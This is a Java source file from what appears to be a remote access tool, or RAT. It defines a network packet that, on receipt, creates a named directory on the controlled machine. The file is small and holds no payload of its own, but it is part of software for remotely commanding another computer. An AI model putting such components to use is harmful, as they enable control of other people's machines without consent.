package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveConnection;

public final class CreateDirectoryPacket implements IPacket {
	
	private String path, name;
	
	private static final String FILE_SEPARATOR = "/";
	
	public CreateDirectoryPacket(final String path, final String name) {
		this.path = path;
		this.name = name;
	}
	
	public CreateDirectoryPacket() {
		this("", "");
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeUTF(path);
		connection.writeUTF(name);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		path = connection.readUTF();
		name = connection.readUTF();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		final File folder = new File(path);
		
		String fullPath = null;
		
		if (folder.isDirectory()) {
			fullPath = path + FILE_SEPARATOR + name;
		} else {
			final File parent = folder.getParentFile();
			
			if (parent != null) {
				fullPath = parent.getAbsolutePath() + FILE_SEPARATOR + name;
			}
		}
		
		if (fullPath != null) {
			FileUtils.createFolder(fullPath);
		}
	}
	
	public String getPath() {
		return path;
	}
	
	public String getName() {
		return name;
	}
	
}
